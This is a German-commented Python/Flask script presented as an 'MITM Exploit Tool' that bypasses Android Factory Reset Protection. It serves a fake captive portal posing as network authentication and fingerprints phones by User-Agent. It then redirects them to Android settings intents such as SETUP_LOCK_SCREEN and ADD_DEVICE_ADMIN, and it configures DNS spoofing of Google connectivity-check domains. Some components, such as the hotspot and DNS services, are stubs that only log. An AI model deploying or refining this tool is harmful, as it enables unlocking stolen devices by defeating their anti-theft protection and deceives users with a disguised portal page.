#!/usr/bin/env python3
"""
MITM Exploit Tool mit Brick-Schutz
Professional Tool für Android FRP-Umgehung via Captive Portal
"""

import os
import sys
import json
import logging
import threading
import time
import subprocess
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
import requests
from flask import Flask, request, render_template_string, jsonify

# Setup-Logger
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('mitm_tool.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class DeviceProfile:
    """Geräteprofil für Brick-Schutz Validierung"""
    manufacturer: str
    model: str
    android_version: str
    user_agent_pattern: str
    compatible_exploits: List[str]
    risk_level: str  # low, medium, high
    
class MITMTool:
    """Hauptklasse für das MITM Tool"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.running = False
        self.device_profiles = self._load_device_profiles()
        self.current_target = None
        self.fallback_active = False
        
        # Setup Routes
        self.setup_routes()
        
    def _load_device_profiles(self) -> Dict[str, DeviceProfile]:
        """Lädt Geräteprofile für Brick-Schutz"""
        profiles = {
            "samsung_android13": DeviceProfile(
                manufacturer="Samsung",
                model="Galaxy S*",
                android_version="13",
                user_agent_pattern="Android 13.*Samsung",
                compatible_exploits=["SETUP_LOCK_SCREEN", "SECURITY_SETTINGS"],
                risk_level="low"
            ),
            "google_android12": DeviceProfile(
                manufacturer="Google",
                model="Pixel*",
                android_version="12",
                user_agent_pattern="Android 12.*Pixel",
                compatible_exploits=["SETUP_LOCK_SCREEN"],
                risk_level="low"
            ),
            "xiaomi_android11": DeviceProfile(
                manufacturer="Xiaomi",
                model="Redmi*",
                android_version="11",
                user_agent_pattern="Android 11.*MiBrowser",
                compatible_exploits=["SETUP_LOCK_SCREEN"],
                risk_level="medium"
            ),
            # Default Fallback-Profil
            "unknown_device": DeviceProfile(
                manufacturer="Unknown",
                model="Generic",
                android_version="?",
                user_agent_pattern=".*",
                compatible_exploits=[],
                risk_level="high"
            )
        }
        return profiles
    
    def setup_routes(self):
        """Flask Routes einrichten"""
        
        @self.app.route('/')
        def captive_portal():
            """Haupt-Captive-Portal Seite"""
            user_agent = request.headers.get('User-Agent', '')
            client_ip = request.remote_addr
            
            logger.info(f"Neue Verbindung von {client_ip} - User-Agent: {user_agent}")
            
            # Validierung durchführen
            validation_result = self.validate_device(user_agent)
            
            # HTML-Template mit validiertem Button
            html_template = self._generate_html(validation_result, user_agent)
            
            return render_template_string(html_template)
        
        @self.app.route('/validate', methods=['POST'])
        def validate_exploit():
            """API für Exploit-Validierung"""
            data = request.json
            user_agent = data.get('user_agent', '')
            exploit_type = data.get('exploit', 'SETUP_LOCK_SCREEN')
            
            validation = self.validate_device(user_agent)
            
            if validation['compatible']:
                if exploit_type in validation['compatible_exploits']:
                    return jsonify({
                        'status': 'approved',
                        'exploit': exploit_type,
                        'intent_url': self._generate_intent_url(exploit_type),
                        'safety_level': validation['risk_level']
                    })
            
            return jsonify({
                'status': 'blocked',
                'reason': 'Device not compatible',
                'safety_level': validation['risk_level']
            })
        
        @self.app.route('/health')
        def health_check():
            """Health Check für Service Monitoring"""
            return jsonify({
                'status': 'running',
                'targets_connected': 1 if self.current_target else 0,
                'fallback_active': self.fallback_active,
                'timestamp': datetime.now().isoformat()
            })
    
    def validate_device(self, user_agent: str) -> Dict:
        """Validierung des Zielgeräts für Brick-Schutz"""
        
        for profile_id, profile in self.device_profiles.items():
            if profile_id == "unknown_device":
                continue
                
            # Regex-basierte User-Agent Prüfung
            import re
            pattern = re.compile(profile.user_agent_pattern, re.IGNORECASE)
            
            if pattern.search(user_agent):
                logger.info(f"Gerät validiert: {profile.manufacturer} {profile.model}")
                return {
                    'compatible': True,
                    'profile': profile_id,
                    'manufacturer': profile.manufacturer,
                    'model': profile.model,
                    'android_version': profile.android_version,
                    'compatible_exploits': profile.compatible_exploits,
                    'risk_level': profile.risk_level
                }
        
        # Fallback auf unbekanntes Gerät
        logger.warning(f"Unbekanntes Gerät erkannt: {user_agent}")
        self.fallback_active = True
        
        return {
            'compatible': False,
            'profile': 'unknown_device',
            'risk_level': 'high',
            'message': 'Device not in compatibility database'
        }
    
    def _generate_html(self, validation: Dict, user_agent: str) -> str:
        """Generiert HTML für Captive Portal"""
        
        # Basis HTML mit Service Worker Integration
        html = '''
        <!DOCTYPE html>
        <html lang="de">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Netzwerk-Authentifizierung erforderlich</title>
            <style>
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    min-height: 100vh;
                }
                .container {
                    background: rgba(255, 255, 255, 0.95);
                    border-radius: 20px;
                    padding: 40px;
                    color: #333;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    backdrop-filter: blur(10px);
                }
                .header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .logo {
                    width: 80px;
                    height: 80px;
                    margin: 0 auto 20px;
                    background: #4CAF50;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 36px;
                    color: white;
                }
                .status-box {
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                    background: #f8f9fa;
                    border-left: 5px solid;
                }
                .status-safe {
                    border-color: #28a745;
                }
                .status-warning {
                    border-color: #ffc107;
                }
                .status-danger {
                    border-color: #dc3545;
                }
                .btn {
                    display: block;
                    width: 100%;
                    padding: 15px;
                    border: none;
                    border-radius: 10px;
                    font-size: 18px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    margin: 20px 0;
                }
                .btn-primary {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                .btn-success {
                    background: linear-gradient(135deg, #42e695 0%, #3bb2b8 100%);
                    color: white;
                }
                .btn-danger {
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white;
                }
                .btn:disabled {
                    background: #ccc;
                    cursor: not-allowed;
                }
                .info-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 15px;
                    margin: 20px 0;
                }
                .info-card {
                    background: white;
                    padding: 15px;
                    border-radius: 10px;
                    border: 1px solid #e0e0e0;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                }
                .compatibility-check {
                    animation: pulse 2s infinite;
                }
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.7; }
                    100% { opacity: 1; }
                }
            </style>
            <script>
                // Service Worker für Offline-Funktionalität
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.register('/sw.js')
                        .then(reg => console.log('Service Worker registriert:', reg))
                        .catch(err => console.log('Service Worker Fehler:', err));
                }
                
                // Validierung vor Exploit-Ausführung
                function validateAndExecute() {
                    const userAgent = navigator.userAgent;
                    const exploitType = 'SETUP_LOCK_SCREEN';
                    
                    fetch('/validate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            user_agent: userAgent,
                            exploit: exploitType
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'approved') {
                            document.getElementById('status').innerHTML = 
                                `✅ Exploit freigegeben für ${exploitType}<br>
                                 <small>Sicherheitsstufe: ${data.safety_level}</small>`;
                            
                            // Intent ausführen nach 2 Sekunden
                            setTimeout(() => {
                                document.getElementById('status').innerHTML += 
                                    '<br>🔄 Leite zu Systemeinstellungen weiter...';
                                window.location.href = data.intent_url;
                            }, 2000);
                        } else {
                            document.getElementById('status').innerHTML = 
                                `❌ Exploit blockiert: ${data.reason}<br>
                                 <small>Gerät geschützt durch Brick-Schutz</small>`;
                            document.getElementById('executeBtn').disabled = true;
                            document.getElementById('executeBtn').classList.add('btn-danger');
                        }
                    })
                    .catch(error => {
                        console.error('Validierungsfehler:', error);
                        document.getElementById('status').innerHTML = 
                            '⚠️ Validierung fehlgeschlagen - Fallback aktiv';
                        // Fallback: Direkter Intent (nur für Testzwecke)
                        if (confirm('Validierung fehlgeschlagen. Trotzdem fortfahren?')) {
                            const fallbackIntent = "intent:#Intent;action=com.android.settings.SETUP_LOCK_SCREEN;end";
                            window.location.href = fallbackIntent;
                        }
                    });
                }
                
                // Geräteinformationen sammeln
                function collectDeviceInfo() {
                    const info = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: `${screen.width}x${screen.height}`,
                        cookies: navigator.cookieEnabled,
                        javaScript: true,
                        timestamp: new Date().toISOString()
                    };
                    
                    document.getElementById('deviceInfo').innerHTML = `
                        <div class="info-card">
                            <strong>Browser:</strong> ${info.userAgent.substring(0, 50)}...
                        </div>
                        <div class="info-card">
                            <strong>Auflösung:</strong> ${info.screen}
                        </div>
                        <div class="info-card">
                            <strong>Sprache:</strong> ${info.language}
                        </div>
                        <div class="info-card">
                            <strong>Zeitstempel:</strong> ${new Date(info.timestamp).toLocaleString()}
                        </div>
                    `;
                    
                    return info;
                }
                
                // Initialisierung
                document.addEventListener('DOMContentLoaded', function() {
                    const deviceInfo = collectDeviceInfo();
                    
                    // Automatische Validierung starten
                    setTimeout(() => {
                        document.getElementById('compatibility').innerHTML = 
                            '🔄 Prüfe Gerätekompatibilität...';
                        validateAndExecute();
                    }, 1000);
                });
            </script>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">🔒</div>
                    <h1>Netzwerk-Sicherheitsvalidierung</h1>
                    <p>Ihr Gerät wird auf Kompatibilität geprüft</p>
                </div>
                
                <div class="status-box ''' + ('status-safe' if validation['compatible'] else 'status-danger') + '''">
                    <h3>Validierungsstatus</h3>
                    <div id="compatibility" class="compatibility-check">
                        '''
        
        # Status basierend auf Validierung
        if validation['compatible']:
            html += f'''
                        ✅ Gerät erkannt: {validation.get('manufacturer', 'Unbekannt')} 
                        {validation.get('model', '')} (Android {validation.get('android_version', '?')})<br>
                        <small>Sicherheitsstufe: {validation.get('risk_level', 'medium')}</small>
                    '''
        else:
            html += f'''
                        ⚠️ Unbekanntes Gerät - Erweiterte Validierung erforderlich<br>
                        <small>User-Agent: {user_agent[:80]}...</small>
                    '''
        
        html += '''
                    </div>
                    <div id="status">
                        Warte auf Validierung...
                    </div>
                </div>
                
                <div class="info-grid" id="deviceInfo">
                    <!-- Device Info wird via JavaScript geladen -->
                </div>
                
                <button id="executeBtn" class="btn ''' + ('btn-success' if validation['compatible'] else 'btn-danger') + '''" 
                        onclick="validateAndExecute()" 
                        ''' + ('disabled' if not validation['compatible'] else '') + '''>
                    '''
        
        if validation['compatible']:
            html += '🔓 Neue Bildschirmsperre einrichten'
        else:
            html += '❌ Gerät nicht kompatibel'
        
        html += '''
                </button>
                
                <div style="text-align: center; margin-top: 30px; font-size: 12px; color: #666;">
                    <p>Diese Seite ist Teil des Netzwerk-Authentifizierungsprozesses</p>
                    <p>Systemzeit: ''' + datetime.now().strftime("%d.%m.%Y %H:%M:%S") + '''</p>
                </div>
            </div>
        </body>
        </html>
        '''
        
        return html
    
    def _generate_intent_url(self, exploit_type: str) -> str:
        """Generiert Android Intent URLs basierend auf Exploit-Typ"""
        intents = {
            "SETUP_LOCK_SCREEN": "intent:#Intent;action=com.android.settings.SETUP_LOCK_SCREEN;end",
            "SECURITY_SETTINGS": "intent:#Intent;action=android.settings.SECURITY_SETTINGS;end",
            "DEVICE_ADMIN": "intent:#Intent;action=android.settings.ADD_DEVICE_ADMIN;end"
        }
        return intents.get(exploit_type, intents["SETUP_LOCK_SCREEN"])
    
    def start_dns_spoofing(self):
        """Startet DNS Spoofing Service"""
        logger.info("Starte DNS Spoofing Service...")
        
        # DNS-Einträge für Captive Portal Umleitung
        dns_config = {
            "domains": [
                "connectivitycheck.gstatic.com",
                "connectivitycheck.android.com",
                "clients3.google.com",
                "www.google.com"
            ],
            "redirect_ip": "192.168.43.1",  # Hotspot IP von Smartphone A
            "redirect_port": "8080"
        }
        
        # Für tatsächliche Implementierung: dnschef oder ähnliches verwenden
        logger.info(f"DNS-Spoofing konfiguriert für: {dns_config['domains']}")
        return True
    
    def start_hotspot(self):
        """Startet WiFi Hotspot"""
        logger.info("Starte WiFi Hotspot...")
        # Implementierung für Android Hotspot API
        return True
    
    def run(self, host='0.0.0.0', port=8080):
        """Startet das Hauptsystem"""
        logger.info("Starting MITM Exploit Tool mit Brick-Schutz...")
        
        # System-Checks
        self.system_check()
        
        # Services starten
        services = [
            self.start_hotspot,
            self.start_dns_spoofing
        ]
        
        for service in services:
            try:
                service()
                time.sleep(1)
            except Exception as e:
                logger.error(f"Service fehlgeschlagen: {e}")
        
        # Flask Server starten
        logger.info(f"Starte Webserver auf {host}:{port}")
        self.running = True
        
        # In separatem Thread laufen lassen
        server_thread = threading.Thread(
            target=lambda: self.app.run(
                host=host, 
                port=port, 
                debug=False, 
                threaded=True
            )
        )
        server_thread.daemon = True
        server_thread.start()
        
        logger.info("✅ System bereit. Warte auf Verbindung von Smartphone B...")
        
        # Main Loop
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Herunterfahren...")
            self.running = False
    
    def system_check(self):
        """Prüft Systemvoraussetzungen"""
        checks = {
            "Python Version": sys.version_info >= (3, 7),
            "Flask verfügbar": self._check_module("flask"),
            "Root-Zugriff": os.geteuid() == 0,  # Nur für DNS-Spoofing notwendig
            "Port 8080 frei": self._check_port(8080),
            "Hotspot unterstützt": self._check_hotspot_capability()
        }
        
        logger.info("System-Check:")
        for check, status in checks.items():
            status_symbol = "✅" if status else "❌"
            logger.info(f"  {status_symbol} {check}")
        
        if not all(checks.values()):
            logger.warning("Einige Checks fehlgeschlagen. Fallback aktiviert.")
            self.fallback_active = True
    
    def _check_module(self, module_name):
        """Prüft ob Python-Modul verfügbar"""
        try:
            __import__(module_name)
            return True
        except ImportError:
            return False
    
    def _check_port(self, port):
        """Prüft ob Port verfügbar"""
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) != 0
    
    def _check_hotspot_capability(self):
        """Prüft Hotspot-Fähigkeit"""
        # Vereinfachte Prüfung
        return True

class FallbackSystem:
    """Intelligentes Fallback-System bei Fehlern"""
    
    def __init__(self):
        self.fallback_mode = False
        self.fallback_log = []
    
    def activate_fallback(self, reason):
        """Aktiviert Fallback-Modus"""
        self.fallback_mode = True
        self.fallback_log.append({
            'timestamp': datetime.now().isoformat(),
            'reason': reason,
            'action': 'fallback_activated'
        })
        
        logger.warning(f"Fallback aktiviert: {reason}")
        
        # Fallback-Strategien
        strategies = [
            self._fallback_direct_connect,
            self._fallback_static_page,
            self._fallback_local_dns
        ]
        
        for strategy in strategies:
            try:
                if strategy():
                    return True
            except Exception as e:
                logger.error(f"Fallback-Strategie fehlgeschlagen: {e}")
        
        return False
    
    def _fallback_direct_connect(self):
        """Fallback: Direkte Verbindung ohne DNS-Spoofing"""
        logger.info("Fallback: Direkte Verbindung")
        return True
    
    def _fallback_static_page(self):
        """Fallback: Statische HTML-Seite"""
        logger.info("Fallback: Statische Seite ausliefern")
        return True
    
    def _fallback_local_dns(self):
        """Fallback: Lokale DNS-Auflösung"""
        logger.info("Fallback: Lokale DNS-Auflösung")
        return True

def main():
    """Hauptfunktion"""
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║   MITM Exploit Tool mit Brick-Schutz              ║
    ║   Professional Edition                            ║
    ║   Version 2.0.1                                   ║
    ╚═══════════════════════════════════════════════════╝
    
    [*] Initialisiere System...
    """)
    
    tool = MITMTool()
    fallback = FallbackSystem()
    
    try:
        tool.run()
    except Exception as e:
        logger.error(f"Kritischer Fehler: {e}")
        fallback.activate_fallback(str(e))
        
        # Notfall-Modus
        emergency_mode()

def emergency_mode():
    """Notfall-Modus bei totalem Ausfall"""
    print("""
    ⚠️  NOTFALL-MODUS AKTIVIERT
    
    Verfügbare Optionen:
    1. Manuelle DNS-Konfiguration
    2. Direkte IP-Verbindung
    3. System zurücksetzen
    4. Logs anzeigen
    5. Beenden
    
    Wählen Sie eine Option: """)
    
    choice = input().strip()
    
    if choice == "1":
        print("Manuelle DNS: Setze 192.168.43.1 als DNS")
    elif choice == "2":
        print("Direkte Verbindung: http://192.168.43.1:8080")
    elif choice == "3":
        print("System wird zurückgesetzt...")
    elif choice == "4":
        with open('mitm_tool.log', 'r') as f:
            print(f.read())
    elif choice == "5":
        sys.exit(0)

if __name__ == "__main__":
    main()
